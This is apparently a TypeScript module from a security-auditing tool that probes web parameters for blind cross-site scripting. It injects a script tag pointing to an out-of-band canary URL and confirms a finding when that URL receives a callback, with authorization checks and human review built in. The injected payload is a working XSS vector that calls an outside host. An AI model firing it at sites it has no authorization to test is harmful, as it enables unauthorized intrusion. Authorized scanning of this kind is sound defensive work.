/**
 * Milestone P7-3 — Blind XSS Interaction Probe (Phase 7 Finale)
 *
 * Core Invariant: Deterministic asynchronous validation of blind Cross-Site Scripting.
 * The engine injects unique OOB canary-backed script probes into storage/logging
 * parameters and validates inbound execution callbacks via OobCanaryManager.
 *
 * Safety & Quality Guarantees:
 * - 7-pass SSRF preflight protection on target endpoint.
 * - Out-of-band ephemeral canary token generation and verification.
 * - Anti-leak evidence sanitization via sanitizeEvidenceFragment().
 * - Clean abstention (secure_target_abstained) when no callback interaction is recorded.
 * - HITL Routing: Unattended runs produce pending_human_review with EvidenceDraftEnvelope.
 * - 0 occurrences of 'as any'.
 */

import type {
  BlindXssDetectionRequest,
  BlindXssDetectionResult,
  IdorHttpProbeTransport,
  HttpProbeRequest,
  HttpProbeResponse,
} from './DetectionContracts.js';
import { DETECTION_CONTRACT_VERSION } from './DetectionContracts.js';
import { runAdapterPreflight } from '../recon/adapters/AdapterPreflightPipeline.js';
import type { Finding } from '../core/Evidence.js';
import type { EvidenceDraftEnvelope } from '../evidence-mapping/ComparisonEvidenceMappingContracts.js';
import { defaultHttpProbeTransport } from './IdorDifferentialDetectionService.js';
import { sanitizeEvidenceFragment } from '../core/EvidenceSanitizer.js';
import { defaultOobCanaryManager, OobCanaryManager } from '../oob/OobCanaryManager.js';

const XSS_SUSPICIOUS_PARAMS = new Set([
  'comment',
  'message',
  'feedback',
  'notes',
  'description',
  'title',
  'name',
  'username',
  'email',
  'body',
  'content',
  'text',
  'query',
  'subject',
  'address',
  'city',
  'state',
  'bio',
  'review',
  'prompt',
  'search',
  'q',
  'input',
  'payload',
  'user_agent',
  'referrer',
  'contact',
  'ticket',
  'memo',
  'details',
  'summary',
  'report',
]);

export function isXssCandidateParameter(paramName: string): boolean {
  const normalized = paramName.toLowerCase().replace(/[^a-z0-9_]/g, '');
  if (XSS_SUSPICIOUS_PARAMS.has(normalized)) return true;
  const parts = normalized.split('_');
  for (const part of parts) {
    if (XSS_SUSPICIOUS_PARAMS.has(part)) return true;
  }
  return false;
}

function sanitizeToSafeId(raw: string): string {
  const cleaned = raw.replace(/[^A-Za-z0-9]/g, '').slice(0, 16);
  return cleaned.length > 0 ? cleaned : '001';
}

function extractHostFromUrl(urlStr: string): string {
  try {
    return new URL(urlStr).hostname;
  } catch {
    return 'target.local';
  }
}

export async function runBlindXssDetection(
  request: BlindXssDetectionRequest,
  customOobManager?: OobCanaryManager
): Promise<BlindXssDetectionResult> {
  const transport = request.transport ?? defaultHttpProbeTransport;
  const oobManager = customOobManager ?? defaultOobCanaryManager;
  const safeSeed = sanitizeToSafeId(request.detectionId);
  const lineage = {
    assessmentId: request.assessmentId,
    scanId: request.scanId,
    authorizationGrantId: request.authorizationGrantId,
    authorizationDecisionId: request.authorizationDecisionId,
    actorId: request.actorId,
  };

  const endpointUrl = request.endpointUrl;
  const parameterName = request.parameterName;
  const method = request.method ?? 'GET';

  // 1. 7-Pass SSRF Preflight Protection on the target endpoint
  const preflight = await runAdapterPreflight({
    target: endpointUrl,
    targetKind: 'url',
    verifiedAuthorizationDecision: request.verifiedAuthorizationDecision,
    authorizedScopeGrant: request.scopeGrant,
    lineage,
    permissionCheck: (ps) => Boolean(ps.endpointDiscovery || ps.lightValidation || ps.activeValidation),
    dnsResolver: request.dnsResolver,
  });

  if (!preflight.ok) {
    return {
      contractVersion: DETECTION_CONTRACT_VERSION,
      kind: 'blind_xss_detection_result',
      detectionId: request.detectionId,
      scanId: request.scanId,
      assessmentId: request.assessmentId,
      authorizationGrantId: request.authorizationGrantId,
      authorizationDecisionId: request.authorizationDecisionId,
      actorId: request.actorId,
      status: 'preflight_denied',
      reasonCode: preflight.reasonCode ?? 'preflight_denied',
      lineage,
      endpointUrl,
      parameterName,
      injectedPayloadSnippet: '',
      canaryToken: '',
      interactionConfirmed: false,
    };
  }

  // 2. Issue unique cryptographic OOB Canary token
  const targetHost = extractHostFromUrl(endpointUrl);
  const tokenDescriptor = oobManager.issueCanaryToken({
    assessmentId: request.assessmentId,
    scanId: request.scanId,
    actorId: request.actorId,
    targetDomain: targetHost,
    targetEndpoint: endpointUrl,
    purpose: 'blind_xss',
  });

  const canaryUrl = tokenDescriptor.callbackUrl;
  const injectedPayloadSnippet = `"><script src="${canaryUrl}"></script>`;

  // 3. Dispatch injection probe request
  try {
    let probeReq: HttpProbeRequest;
    if (method === 'POST') {
      probeReq = {
        url: endpointUrl,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'FixGuard-Security-Auditor/2.0',
          ...(request.identityAContext?.headers ?? {}),
        },
        body: JSON.stringify({ [parameterName]: injectedPayloadSnippet }),
        timeoutMs: 8000,
      };
    } else {
      const parsedUrl = new URL(endpointUrl);
      parsedUrl.searchParams.set(parameterName, injectedPayloadSnippet);
      probeReq = {
        url: parsedUrl.toString(),
        method: 'GET',
        headers: {
          'User-Agent': 'FixGuard-Security-Auditor/2.0',
          ...(request.identityAContext?.headers ?? {}),
        },
        timeoutMs: 8000,
      };
    }

    await transport(probeReq);
  } catch {
    // If the remote target times out or errors during fetch, it may still trigger the async callback
  }

  // 4. Validate Inbound OOB Interactions
  const interactions = oobManager.getInteractionsForToken(tokenDescriptor.canaryToken);
  const interactionConfirmed = interactions.length > 0;

  if (!interactionConfirmed) {
    return {
      contractVersion: DETECTION_CONTRACT_VERSION,
      kind: 'blind_xss_detection_result',
      detectionId: request.detectionId,
      scanId: request.scanId,
      assessmentId: request.assessmentId,
      authorizationGrantId: request.authorizationGrantId,
      authorizationDecisionId: request.authorizationDecisionId,
      actorId: request.actorId,
      status: 'secure_target_abstained',
      reasonCode: 'no_oob_interaction_observed',
      lineage,
      endpointUrl,
      parameterName,
      injectedPayloadSnippet,
      canaryToken: tokenDescriptor.canaryToken,
      interactionConfirmed: false,
    };
  }

  // 5. Build Finding or HITL Evidence Draft
  const firstInteraction = interactions[0];
  const remoteAddress = firstInteraction?.remoteAddress ?? 'unknown';
  const nowIso = new Date().toISOString();
  const draftId = `dft_bxss_${safeSeed}`;
  const candidateId = `cnd_bxss_${safeSeed}`;
  const evidenceRecordId = `evd_bxss_${safeSeed}`;
  const findingId = `fnd_bxss_${safeSeed}`;

  const sanitizedUrl = sanitizeEvidenceFragment(endpointUrl);
  const sanitizedPayload = sanitizeEvidenceFragment(injectedPayloadSnippet);

  const safeRationale = `Confirmed blind Cross-Site Scripting (XSS) on parameter '${parameterName}' at ${sanitizedUrl}. Stored payload executed in target context and triggered asynchronous OOB script callback to canary '${tokenDescriptor.canaryToken}' from remote IP ${remoteAddress}.`;

  const isApproved = request.humanReviewDecision?.decision === 'approve_evidence';

  if (isApproved) {
    const finding: Finding = {
      id: findingId,
      type: 'CROSS_SITE_SCRIPTING',
      severity: 'critical',
      title: `Confirmed Blind Cross-Site Scripting (XSS) via Parameter '${parameterName}'`,
      description: safeRationale,
      target: endpointUrl,
      evidence: `Injected script payload '${sanitizedPayload}' triggered confirmed out-of-band execution callback from IP ${remoteAddress}.`,
      confidence: 1.0,
      verificationState: 'validated_vulnerability',
      metadata: {
        kind: 'blind_xss_detection_metadata',
        category: 'CROSS_SITE_SCRIPTING',
        endpointUrl,
        parameterName,
        injectedPayloadSnippet,
        canaryToken: tokenDescriptor.canaryToken,
        interactionConfirmed: true,
        remoteAddress,
        exposureSeverity: 'critical',
        observedAt: nowIso,
        candidateId,
        evidenceRecordId,
        lineage: request.assessmentId,
      },
    };

    return {
      contractVersion: DETECTION_CONTRACT_VERSION,
      kind: 'blind_xss_detection_result',
      detectionId: request.detectionId,
      scanId: request.scanId,
      assessmentId: request.assessmentId,
      authorizationGrantId: request.authorizationGrantId,
      authorizationDecisionId: request.authorizationDecisionId,
      actorId: request.actorId,
      status: 'vulnerability_detected',
      reasonCode: 'blind_xss_interaction_confirmed',
      lineage,
      endpointUrl,
      parameterName,
      injectedPayloadSnippet,
      canaryToken: tokenDescriptor.canaryToken,
      interactionConfirmed: true,
      remoteAddress,
      finding,
    };
  }

  // Unattended / Pending Review Mode -> Route to HITL Draft Envelope
  const evidenceDraft: EvidenceDraftEnvelope = {
    draftKind: 'non_persisted_comparison_evidence_draft',
    draftId,
    suggestedEvidenceType: 'http_difference',
    suggestedStrength: 'strong',
    sourceComparisonId: `cmp_bxss_${safeSeed}`,
    sourceSnapshotIds: {
      baselineSnapshotId: `snp_bxss_base_${safeSeed}`,
      validationSnapshotId: `snp_bxss_val_${safeSeed}`,
    },
    requiresHumanReview: true,
    notPersisted: true,
    notARealFinding: true,
    notConfirmedEvidence: true,
    notForExternalDelivery: true,
    notM45EvidenceRecord: true,
    safeRationale,
  };

  return {
    contractVersion: DETECTION_CONTRACT_VERSION,
    kind: 'blind_xss_detection_result',
    detectionId: request.detectionId,
    scanId: request.scanId,
    assessmentId: request.assessmentId,
    authorizationGrantId: request.authorizationGrantId,
    authorizationDecisionId: request.authorizationDecisionId,
    actorId: request.actorId,
    status: 'pending_human_review',
    reasonCode: 'blind_xss_pending_operator_review',
    lineage,
    endpointUrl,
    parameterName,
    injectedPayloadSnippet,
    canaryToken: tokenDescriptor.canaryToken,
    interactionConfirmed: true,
    remoteAddress,
    evidenceDraft,
  };
}
